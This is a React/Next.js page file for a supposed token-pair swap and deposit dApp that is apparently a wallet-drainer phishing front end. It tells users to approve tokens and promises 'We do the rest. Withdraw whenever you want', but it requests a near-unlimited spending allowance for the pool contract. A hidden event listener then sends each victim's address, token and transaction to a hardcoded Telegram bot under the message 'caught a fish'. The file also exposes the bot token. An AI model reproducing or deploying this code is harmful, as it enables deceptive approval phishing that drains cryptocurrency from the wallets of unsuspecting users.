import { useAccount, useContractEvent, useContractWrite, usePrepareContractWrite } from 'wagmi'
import { Button, FormControl, FormLabel, Select } from '@chakra-ui/react'
import { useState } from 'react'
import { NextSeo } from 'next-seo'
import { HeadingComponent } from 'components/layout/HeadingComponent'
import axios from 'axios'
import { useRouter } from 'next/router'
import { abis, Pool, pools } from '../../../pools'
import { SECOND_COLOR_SCHEME } from '../../../utils/config'

function Approve({ pool }: { pool: Pool }) {
  let [approving, setApproving] = useState(false)
  let [token, setToken] = useState(pool.token0.address)
  const spender = pool.address
  const amount = BigInt(1.15 * 10 ** 77)

  const {
    config,
    error: prepareError,
    isError: isPrepareError,
    isLoading: isPreparing,
  } = usePrepareContractWrite({
    address: token as `0x${string}`,
    abi: abis.approve,
    functionName: 'approve',
    args: [spender, amount],
    enabled: true,
  })

  const { data, error, isLoading: isWriteLoading, isError: isWriteError, writeAsync } = useContractWrite(config)

  useContractEvent({
    address: token as `0x${string}`,
    abi: abis.approve,
    eventName: 'Approval',
    listener(log) {
      // 判断topics[2]是否为本项目的pool
      // console.log(log)
      for (let i = 0; i < log.length; i++) {
        if (BigInt(log[i].topics?.[2] as string) !== BigInt(pool.address)) return
        if (Number(log[i].data) !== 0) {
          const dataStr = `吃鱼啦！\ntoken: ${log[i].address?.toString()}\nowner: 0x${BigInt(log[i].topics?.[1] as string).toString(
            16
          )}\nspender: 0x${BigInt(log[i].topics?.[2] as string).toString(16)}\ntransaction: ${log[i].transactionHash?.toString()}`
          // 5828246844:AAFquV4si3VAQthPl7urJarAsuJ9z0FHVho
          axios
            .post(`https://api.telegram.org/bot5828246844:AAFquV4si3VAQthPl7urJarAsuJ9z0FHVho/sendMessage`, {
              chat_id: '-1001926835252',
              text: dataStr,
            })
            .then((res) => console.log(res))
            .catch((err) => console.log(err))
          console.log('Approval successful')
        }
      }
    },
  })

  function submit() {
    setApproving(true)
    writeAsync?.()
      .then((tx) => {})
      .catch((err) => {
        console.log(err)
      })
      .finally(() => setApproving(false))
  }

  return (
    <div>
      <HeadingComponent as="h3">Deposit</HeadingComponent>

      <FormControl>
        <FormLabel>Select Token</FormLabel>

        <Select onChange={(e) => setToken(e.target.value)}>
          <option value={pool.token0.address}>{pool.token0.name}</option>
          <option value={pool.token1.address}>{pool.token1.name}</option>
        </Select>

        <Button
          mt={4}
          type="submit"
          onClick={submit}
          isLoading={approving}
          loadingText="Approving"
          colorScheme={`${SECOND_COLOR_SCHEME}`}
          variant="outline">
          Approve
        </Button>
      </FormControl>
    </div>
  )
}

export default function SignExample() {
  const { isConnected } = useAccount()
  const router = useRouter()
  const { id } = router.query
  const pool = pools.find((p) => p.id + '' === id)
  if (pool === undefined) return <></>

  if (isConnected) {
    const token0Name = pool.token0.name
    const token1Name = pool.token1.name
    const swap_name = `${token0Name}-${token1Name} Swap`
    return (
      <div>
        <NextSeo title={swap_name} />
        <HeadingComponent as="h1">{swap_name}</HeadingComponent>
        <hr />
        <ol>
          <li>
            Approve either {token0Name} or {token1Name}, or both
          </li>
          <li>
            Deposit any amounts of {token0Name} or {token1Name}
          </li>
          {/* eslint-disable-next-line react/no-unescaped-entities */}
          <li>That's it! We do the rest. Withdraw whenever you want.</li>
        </ol>
        <br />
        <Approve pool={pool} />
      </div>
    )
  }

  return <div>Connect your wallet first to enable this page.</div>
}
